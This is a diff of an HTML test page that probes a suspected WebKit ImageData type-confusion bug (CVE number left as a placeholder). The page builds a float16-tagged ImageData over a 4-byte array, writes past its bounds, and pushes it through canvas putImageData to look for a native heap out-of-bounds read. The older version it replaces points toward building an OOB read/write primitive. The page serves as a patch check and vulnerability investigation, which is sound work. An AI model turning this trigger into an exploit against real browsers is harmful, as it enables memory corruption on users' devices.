@@ -1,47 +1,204 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CVE-2026-XXXX - ImageData Type Confusion Test</title>
+  <meta charset="UTF-8" />
+  <title>Test 1 — OOB Investigation</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
+    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.3rem; }
+    .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
+    .card { background: #161616; border: 1px solid #222; border-radius: 8px; padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 720px; }
+    .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
+    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.25rem 0.7rem; border-radius: 4px; margin-bottom: 0.5rem; }
+    .red   { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
+    .green { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
+    .yellow{ background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
+    .blue  { background: #1a1a2d; color: #8888ff; border: 1px solid #33336a; }
+    .gray  { background: #1a1a1a; color: #888;    border: 1px solid #333; }
+    pre { font-size: 0.78rem; color: #aaa; background: #111; padding: 0.8rem 1rem; border-radius: 4px; border-left: 2px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin-top: 0.6rem; }
+    .row { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.4rem; }
+    .kv { font-size: 0.75rem; color: #666; margin-top: 0.3rem; }
+    .kv span { color: #aaa; }
+    hr { border: none; border-top: 1px solid #1e1e1e; margin: 0.8rem 0; }
+  </style>
 </head>
-<body style="background-color: #1e1e1e; color: white; font-family: monospace;">
-    <h1>WebKit ImageData Vulnerability Check</h1>
-    <div id="log"></div>
+<body>
 
-    <script>
-        function logMessage(msg, color) {
-            const logDiv = document.getElementById("log");
-            logDiv.innerHTML += `<p style="color: ${color}; font-size: 18px;">${msg}</p>`;
-        }
+<h1>Test 1 — OOB Investigation</h1>
+<p class="sub">Uint8ClampedArray(4) + pixelFormat: "rgba-float16" — patch check + read/write probe</p>
 
-        function checkImageDataVulnerability() {
-            logMessage("[*] Initializing test payload...", "yellow");
-            
-            try {
-                // 1. إنشاء مصفوفة بحجم صغير (Uint8ClampedArray)
-                let testArray = new Uint8ClampedArray(4); // 4 bytes total
-                
-                // 2. محاولة دمجها مع إعدادات تتطلب حجم أكبر (rgba-float16)
-                // في النسخ المصابة، سيمر هذا السطر دون أخطاء.
-                let img = new ImageData(testArray, 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" });
-                
-                // 3. إذا وصلنا إلى هنا، فهذا يعني أن المتصفح قبل التناقض!
-                logMessage("[!] VULNERABLE: The browser accepted mismatched pixel formats (No exception thrown).", "red");
-                logMessage("[!] You can proceed to build the OOB Read/Write primitive.", "red");
-                
-            } catch (e) {
-                // 4. في النسخ المحدثة، سيتم إيقاف العملية هنا
-                if (e.name === "InvalidStateError") {
-                    logMessage("[+] PATCHED: The browser threw 'InvalidStateError' as expected.", "green");
-                } else if (e.name === "TypeError" || e.name === "NotSupportedError") {
-                    logMessage("[-] INCONCLUSIVE: The browser threw '" + e.name + "'. Float16 or pixelFormat dictionary might not be supported on this firmware version.", "orange");
-                } else {
-                    logMessage("[?] UNKNOWN ERROR: " + e.name + " - " + e.message, "orange");
-                }
-            }
-        }
+<div id="out"></div>
 
-        // تشغيل الفحص
-        setTimeout(checkImageDataVulnerability, 1000);
-    </script>
+<script>
+  const log = [];
+  const $ = document.getElementById("out");
+
+  function card(title, content) {
+    const d = document.createElement("div");
+    d.className = "card";
+    d.innerHTML = `<div class="card-title">${title}</div>${content}`;
+    $.appendChild(d);
+  }
+
+  function tag(cls, text) {
+    return `<span class="tag ${cls}">${text}</span>`;
+  }
+
+  // ── STEP 1: Can we even construct it? ──────────────────────────────────────
+  let imgData = null;
+  let constructResult = "";
+  let constructDetail = "";
+
+  try {
+    imgData = new ImageData(new Uint8ClampedArray(4), 1, 1, {
+      colorSpace: "srgb",
+      pixelFormat: "rgba-float16"
+    });
+    constructResult = tag("red", "✗ NO THROW — Constructor accepted mismatched types");
+    constructDetail = `
+      <div class="kv">pixelFormat setting: <span>rgba-float16</span></div>
+      <div class="kv">actual data type:    <span>${imgData.data.constructor.name}</span></div>
+      <div class="kv">data.byteLength:     <span>${imgData.data.byteLength}</span></div>
+      <div class="kv">data.length:         <span>${imgData.data.length}</span></div>
+      <div class="kv">width:               <span>${imgData.width}</span></div>
+      <div class="kv">height:              <span>${imgData.height}</span></div>
+      <div class="kv">colorSpace:          <span>${imgData.colorSpace}</span></div>
+    `;
+  } catch (e) {
+    if (e.name === "InvalidStateError") {
+      constructResult = tag("green", "✓ InvalidStateError — Patch is active");
+      constructDetail = `<div class="kv">Message: <span>${e.message}</span></div>`;
+      imgData = null;
+    } else {
+      constructResult = tag("yellow", `⚠ ${e.name} — Unexpected error type`);
+      constructDetail = `<div class="kv">Message: <span>${e.message}</span></div>`;
+      imgData = null;
+    }
+  }
+
+  card("Step 1 — Construction", constructResult + constructDetail);
+
+  // ── STEP 2: If constructed, inspect the data array ────────────────────────
+  if (imgData) {
+    let html = "";
+
+    // what type did we actually get back?
+    const actualType = imgData.data.constructor.name;
+    const byteLen    = imgData.data.byteLength;
+    const len        = imgData.data.length;
+
+    // float16 for 1x1 rgba should be 4 channels * 2 bytes = 8 bytes
+    // uint8   for 1x1 rgba should be 4 channels * 1 byte  = 4 bytes
+    const expectedFloat16Bytes = 8;
+    const expectedUint8Bytes   = 4;
+
+    html += `<div class="kv">Returned array type: <span>${actualType}</span></div>`;
+    html += `<div class="kv">byteLength: <span>${byteLen}</span> (float16 expects 8, uint8 expects 4)</div>`;
+
+    if (byteLen === expectedUint8Bytes) {
+      html += tag("red", "✗ Buffer is 4 bytes — uint8 sized, but format claims float16. Size mismatch confirmed.");
+    } else if (byteLen === expectedFloat16Bytes) {
+      html += tag("yellow", "⚠ Buffer is 8 bytes — float16 sized. Browser may have converted the array.");
+    } else {
+      html += tag("yellow", `⚠ Unexpected byteLength: ${byteLen}`);
+    }
+
+    // raw bytes
+    const raw = Array.from(new Uint8Array(imgData.data.buffer));
+    html += `<pre>Raw bytes: [${raw.join(", ")}]</pre>`;
+
+    card("Step 2 — Buffer Inspection", html);
+
+    // ── STEP 3: Write then read — does indexing go OOB? ─────────────────────
+    let writeHtml = "";
+    try {
+      // write 4 values as if it were float16 (indices 0-3)
+      // if browser treats it as uint8 internally, index 2 and 3 might alias wrong memory
+      const probe = imgData.data;
+      const before = Array.from(probe);
+      probe[0] = 0xAB;
+      probe[1] = 0xCD;
+      probe[2] = 0xEF;
+      probe[3] = 0x99;
+      const after = Array.from(probe);
+
+      writeHtml += `<div class="kv">Values before write: <span>[${before.join(", ")}]</span></div>`;
+      writeHtml += `<div class="kv">Values after  write: <span>[${after.join(", ")}]</span></div>`;
+
+      // check if writing beyond declared length does anything
+      probe[4] = 0xFF; // index 4 — OOB if length is 4
+      probe[7] = 0xFF; // index 7 — OOB for uint8[4], valid for float16[4]
+      const extended = Array.from(probe);
+      writeHtml += `<div class="kv">After writing index 4 and 7: <span>[${extended.join(", ")}]</span></div>`;
+
+      const oob4 = probe[4];
+      const oob7 = probe[7];
+      writeHtml += `<div class="kv">probe[4] readback: <span>${oob4}</span></div>`;
+      writeHtml += `<div class="kv">probe[7] readback: <span>${oob7}</span></div>`;
+
+      if (oob4 !== undefined || oob7 !== undefined) {
+        writeHtml += tag("red", `✗ OOB indices readable — index 4=${oob4}, index 7=${oob7}. Possible out-of-bounds access.`);
+      } else {
+        writeHtml += tag("green", "✓ OOB indices return undefined — JS bounds check held.");
+      }
+    } catch (e) {
+      writeHtml += tag("yellow", `⚠ Exception during write probe: ${e.name} — ${e.message}`);
+    }
+
+    card("Step 3 — Write / OOB Probe", writeHtml);
+
+    // ── STEP 4: Canvas putImageData — does the GPU/renderer consume wrong bytes? ──
+    let canvasHtml = "";
+    try {
+      const canvas = document.createElement("canvas");
+      canvas.width = 1;
+      canvas.height = 1;
+      const ctx = canvas.getContext("2d");
+
+      ctx.putImageData(imgData, 0, 0);
+      const readback = ctx.getImageData(0, 0, 1, 1);
+      const pixels = Array.from(readback.data);
+
+      canvasHtml += tag("red", "✗ putImageData accepted mismatched ImageData — no error thrown");
+      canvasHtml += `<div class="kv" style="margin-top:0.5rem">Pixel readback (RGBA): <span>[${pixels.join(", ")}]</span></div>`;
+      canvasHtml += `<pre>If readback is garbage or [0,0,0,0] when non-zero was written,
+the renderer consumed the buffer with wrong stride/type assumptions.</pre>`;
+
+      const allZero = pixels.every(v => v === 0);
+      if (allZero) {
+        canvasHtml += tag("yellow", "⚠ Readback all zeros — renderer may have silently dropped or zeroed the mismatched data.");
+      } else {
+        canvasHtml += tag("red", "✗ Non-zero readback — renderer interpreted mismatched bytes as valid pixel data.");
+      }
+    } catch (e) {
+      canvasHtml += tag("green", `✓ putImageData threw: ${e.name} — ${e.message}`);
+    }
+
+    card("Step 4 — Canvas putImageData Probe", canvasHtml);
+
+    // ── STEP 5: Verdict ───────────────────────────────────────────────────────
+    card("Step 5 — Verdict", `
+      <pre>
+Construction:  succeeded without throw  → patch NOT active
+Buffer size:   ${imgData.data.byteLength} bytes            → confirms uint8 array held under float16 claim
+OOB access:    see step 3 readback
+Canvas:        see step 4 readback
+
+CONCLUSION: Browser accepted type-mismatched ImageData.
+Whether this is a real OOB depends on what the internal C++ renderer
+does with the buffer pointer when pixelFormat="rgba-float16" is set
+but the backing store is only 4 bytes instead of 8.
+
+If the renderer reads 8 bytes assuming float16 stride,
+the last 4 bytes are outside the Uint8ClampedArray allocation → heap OOB read.
+JS-layer bounds checks will NOT catch this — it happens in native code.
+      </pre>
+      ${tag("red", "HIGH SUSPICION — requires native heap inspection to confirm true OOB")}
+    `);
+  } else {
+    card("Steps 2–5 — Skipped", tag("green", "Constructor threw as expected — no further probing needed. Patch is active."));
+  }
+</script>
 </body>
 </html>
